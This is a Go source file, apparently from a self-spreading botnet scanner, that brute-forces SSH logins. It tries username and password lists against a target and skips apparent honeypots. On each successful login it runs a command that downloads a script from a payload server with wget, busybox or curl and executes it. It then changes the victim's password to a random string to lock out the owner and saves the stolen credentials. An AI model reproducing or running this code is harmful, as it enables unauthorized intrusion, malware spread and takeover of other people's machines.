package brute

import (
	"fmt"
	"scanner/config"
	"scanner/exploits/ssh/honeypot"
	"scanner/exploits/ssh/login"
	"scanner/exploits/ssh/utils"
	"time"
)

func BruteForce(target string) {
	users, passs := fetchCredits()
	for _, user := range users {
		for _, pass := range passs {
			auth, err := login.TryLogin(target, user.Text, pass.Text)
			if err != nil {
				time.Sleep(10 * time.Millisecond)
				continue
			}

			if honeypot.IsHoneypot(auth) {
				return
			}

			addUsed("username", auth.Username)
			addUsed("password", auth.Password)

			fmt.Printf("[*] login: %s (%s:%s)\r\n", auth.Target, auth.Username, auth.Password)

			command := fmt.Sprintf("cd /tmp;rm -rf %s;wget http://%s/%s;busybox wget http://%s/%s;curl -O http://%s/%s;sh %s scanner.ssh;", config.Script, config.PayloadServer, config.Script, config.PayloadServer, config.Script, config.PayloadServer, config.Script, config.Script)
			auth.RunCommand(command)

			new := utils.RandomString(12)
			err = auth.ChangePassword(new)
			if err != nil {
				new = "none"
			} else {
				fmt.Printf("[+] successful changed password: %s (%s:%s)\r\n", auth.Target, auth.Username, new)
			}

			utils.SaveResult(auth, new)

			return
		}
	}
}
